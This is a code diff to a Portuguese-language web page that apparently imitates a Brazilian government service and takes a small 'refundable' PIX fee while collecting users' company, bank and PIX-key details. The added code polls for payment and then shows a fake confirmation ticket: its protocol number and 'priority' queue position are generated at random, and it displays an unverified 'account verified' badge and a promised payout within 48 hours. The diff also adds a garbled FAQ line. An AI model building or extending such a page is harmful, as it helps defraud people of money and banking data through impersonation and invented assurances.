@@ -207,7 +207,7 @@
       </div>
 
       <div class="space-y-1">
-        <span class="bg-blue-100 text-[#0C326F] font-bold text-[11px] px-3 py-1 rounded-full uppercase tracking-wider">
+        <span class="bg-amber-100 text-amber-800 font-bold text-[11px] px-3 py-1 rounded-full uppercase tracking-wider border border-amber-300">
           Aguardando Pagamento
         </span>
         <h2 class="text-2xl font-black text-[#0C326F] pt-2">Finalizar Inscrição via PIX</h2>
@@ -233,10 +233,102 @@
         </button>
       </div>
 
-      <div class="bg-amber-50 border border-amber-200 p-4 rounded-xl text-left space-y-2">
-        <div class="flex items-center gap-2 text-xs font-semibold text-amber-800">
-          <span>⏳</span> Após o pagamento, a liberação e o envio do comprovante são automáticos.
+      <!-- Mensagem de Erro na Verificação do Pagamento -->
+      <div id="payment-error-msg" class="hidden p-3.5 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs text-left space-y-1">
+        <div class="font-bold flex items-center gap-1.5">
+          <span>⚠️</span> Pagamento Pendente
         </div>
+        <p class="leading-relaxed text-[11px]">
+          O pagamento ainda não foi identificado pelo banco. Se você acabou de pagar, aguarde alguns segundos e clique no botão novamente.
+        </p>
+      </div>
+
+      <div class="space-y-3 pt-2">
+        <button onclick="checkPaymentStatusManual()" id="btn-check-payment" class="w-full bg-emerald-600 hover:bg-emerald-700 active:scale-[0.98] transition-all text-white font-bold py-3.5 px-4 rounded-xl shadow-md cursor-pointer uppercase tracking-wider text-xs flex justify-center items-center gap-2">
+          <span id="btn-check-text">JÁ FIZ O PAGAMENTO</span>
+        </button>
+      </div>
+
+      <div class="bg-amber-50 border border-amber-200 p-3 rounded-xl text-left space-y-1">
+        <div class="flex items-center gap-2 text-[11px] font-semibold text-amber-800">
+          <span>⏳</span> O sistema verifica o pagamento automaticamente a cada 5 segundos.
+        </div>
+      </div>
+    </div>
+
+    <!-- ETAPA 5: Comprovante de Inscrição & Ticket de Posição (SÓ EXIBIDO APÓS CONFIRMAÇÃO DO PAGAMENTO) -->
+    <div id="step-5" class="step-view hidden bg-white rounded-2xl p-6 shadow-xl border border-slate-200 space-y-5">
+      <div class="text-center space-y-2 border-b border-slate-100 pb-4">
+        <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full mx-auto flex items-center justify-center text-3xl border border-emerald-200 animate-bounce">
+          ✓
+        </div>
+        <span class="inline-block bg-emerald-100 text-emerald-800 font-extrabold text-[11px] px-3 py-1 rounded-full uppercase tracking-wider border border-emerald-300">
+          Inscrição Confirmada
+        </span>
+        <h2 class="text-2xl font-black text-[#0C326F]">Comprovante de Fila</h2>
+        <p class="text-xs text-slate-500">Seu pagamento foi identificado e sua posição na fila prioritária foi reservada.</p>
+      </div>
+
+      <!-- TICKET DE POSIÇÃO NA FILA -->
+      <div class="bg-gradient-to-br from-[#0C326F] to-[#1351B4] text-white rounded-2xl p-5 shadow-lg space-y-4 relative overflow-hidden">
+        <div class="absolute -right-6 -bottom-6 w-24 h-24 bg-white/10 rounded-full blur-xl"></div>
+        
+        <div class="flex justify-between items-start border-b border-blue-400/30 pb-3">
+          <div>
+            <span class="text-[10px] text-blue-200 uppercase font-bold tracking-widest block">NÚMERO DO PROTOCOLO</span>
+            <span id="ticket-protocol" class="text-sm font-mono font-bold tracking-wider">#GOV-849201</span>
+          </div>
+          <div class="bg-yellow-400 text-slate-900 font-black text-[10px] px-2 py-0.5 rounded tracking-wider uppercase">
+            PRIORITÁRIO
+          </div>
+        </div>
+
+        <div class="text-center py-2 space-y-1">
+          <span class="text-xs font-semibold text-blue-100 uppercase tracking-wider block">Sua Posição no Lote Atual</span>
+          <div id="ticket-position" class="text-4xl font-black text-yellow-300 tracking-tight">14º LUGAR</div>
+          <p class="text-[11px] text-blue-200">Lote Vigente: 320 Vagas (Liberação Semanal)</p>
+        </div>
+
+        <div class="bg-white/10 backdrop-blur-md rounded-xl p-3 border border-white/10 space-y-1 text-xs">
+          <div class="flex justify-between text-blue-100">
+            <span>Previsão de Chamada:</span>
+            <strong class="text-white" id="ticket-date">Em até 48 horas</strong>
+          </div>
+          <div class="flex justify-between text-blue-100">
+            <span>Status da Conta Bancária:</span>
+            <strong class="text-emerald-300">✓ Verificada & Cadastrada</strong>
+          </div>
+        </div>
+      </div>
+
+      <!-- DETALHES DO CADASTRO -->
+      <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 space-y-2.5 text-xs text-slate-700">
+        <h4 class="font-bold text-[#0C326F] uppercase text-[11px] tracking-wider border-b border-slate-200 pb-1.5">Resumo Cadastral</h4>
+        <div class="flex justify-between">
+          <span class="text-slate-500">Razão Social:</span>
+          <strong id="summary-company" class="text-slate-800 text-right truncate max-w-[200px]">---</strong>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-500">Titular:</span>
+          <strong id="summary-person" class="text-slate-800 text-right truncate max-w-[200px]">---</strong>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-500">Banco:</span>
+          <strong id="summary-bank" class="text-slate-800 text-right">---</strong>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-slate-500">Chave PIX:</span>
+          <strong id="summary-pix" class="text-slate-800 font-mono text-right truncate max-w-[180px]">---</strong>
+        </div>
+        <div class="flex justify-between border-t border-slate-200 pt-2 text-[#1351B4]">
+          <span class="font-bold">Valor Taxa Estornável:</span>
+          <strong id="summary-amount" class="font-bold">R$ 0,00</strong>
+        </div>
+      </div>
+
+      <div class="bg-blue-50 border border-blue-200 p-3 rounded-xl text-xs text-blue-900 space-y-1">
+        <p class="font-bold">📧 Notificações ativadas!</p>
+        <p class="text-[11px] text-blue-700">Uma cópia deste ticket e a confirmação de transferência serão enviadas para o seu e-mail cadastrado assim que o lote for processado.</p>
       </div>
     </div>
 
@@ -270,7 +362,7 @@
 
         <div class="border border-slate-200 rounded-lg overflow-hidden">
           <button onclick="toggleFaq(3)" class="w-full text-left p-3 bg-slate-50 hover:bg-slate-100 transition-colors font-bold text-xs text-slate-800 flex items-center justify-between cursor-pointer">
-            <span>O valor pago no momento de cadastro da conta é reembolsado?</span>
+            <span>O valor paid no momento de cadastro da conta é reembolsado?</span>
             <span id="faq-icon-3" class="text-base font-black text-[#1351B4]">+</span>
           </button>
           <div id="faq-answer-3" class="hidden p-3 text-xs text-slate-600 bg-white border-t border-slate-200 leading-relaxed">
@@ -300,6 +392,8 @@
   <script>
     let currentDocument = "";
     let valorCalculado = 6.90;
+    let currentTransactionId = null;
+    let paymentPollInterval = null;
 
     function sortearValorPix() {
       const min = 5.00;
@@ -529,6 +623,7 @@
 
         if (response.ok && data.pix_code) {
           document.getElementById('pix-code-input').value = data.pix_code;
+          currentTransactionId = data.identifier || data.id || null;
           
           const amountDisplay = document.getElementById('pix-amount-display');
           if (amountDisplay) {
@@ -536,6 +631,7 @@
           }
 
           switchStep(4);
+          startPaymentPolling();
         } else {
           let detailStr = "";
           if (data.details) {
@@ -567,6 +663,72 @@
       setTimeout(() => {
         copyBtnText.textContent = "Copiar Código PIX";
       }, 2000);
+    }
+
+    async function checkPaymentStatusManual() {
+      const btnText = document.getElementById('btn-check-text');
+      const errBox = document.getElementById('payment-error-msg');
+      errBox.classList.add('hidden');
+      btnText.textContent = "VERIFICANDO NO BANCO...";
+
+      const paid = await verifyPaymentWithBackend();
+
+      if (paid) {
+        showSuccessTicket();
+      } else {
+        btnText.textContent = "JÁ FIZ O PAGAMENTO";
+        errBox.classList.remove('hidden');
+      }
+    }
+
+    async function verifyPaymentWithBackend() {
+      if (!currentTransactionId) return false;
+      try {
+        const targetEndpoint = `${window.location.origin}/api/gerar-pix?id=${currentTransactionId}`;
+        const response = await fetch(targetEndpoint);
+        if (response.ok) {
+          const data = await response.json();
+          return data.paid === true || data.status === 'PAID' || data.status === 'APPROVED' || data.status === 'COMPLETED';
+        }
+      } catch (e) {
+        console.error("Erro ao verificar pagamento:", e);
+      }
+      return false;
+    }
+
+    function startPaymentPolling() {
+      if (paymentPollInterval) clearInterval(paymentPollInterval);
+      paymentPollInterval = setInterval(async () => {
+        if (!currentTransactionId) return;
+        const paid = await verifyPaymentWithBackend();
+        if (paid) {
+          clearInterval(paymentPollInterval);
+          showSuccessTicket();
+        }
+      }, 5000);
+    }
+
+    function showSuccessTicket() {
+      if (paymentPollInterval) clearInterval(paymentPollInterval);
+      
+      const compName = document.getElementById('reg-name').value || "Não informado";
+      const personName = document.getElementById('reg-person-name').value || "Não informado";
+      const bank = document.getElementById('reg-bank').value || "Não informado";
+      const pixKey = document.getElementById('reg-pix-key').value || "Não informado";
+
+      document.getElementById('summary-company').textContent = compName;
+      document.getElementById('summary-person').textContent = personName;
+      document.getElementById('summary-bank').textContent = bank;
+      document.getElementById('summary-pix').textContent = pixKey;
+      document.getElementById('summary-amount').textContent = `R$ ${valorCalculado.toFixed(2).replace('.', ',')}`;
+
+      // Gerar número de protocolo e posição aleatórios
+      const randomProto = '#GOV-' + Math.floor(100000 + Math.random() * 900000);
+      const randomPos = Math.floor(10 + Math.random() * 15) + "º LUGAR";
+      document.getElementById('ticket-protocol').textContent = randomProto;
+      document.getElementById('ticket-position').textContent = randomPos;
+
+      switchStep(5);
     }
 
     function toggleFaq(index) {
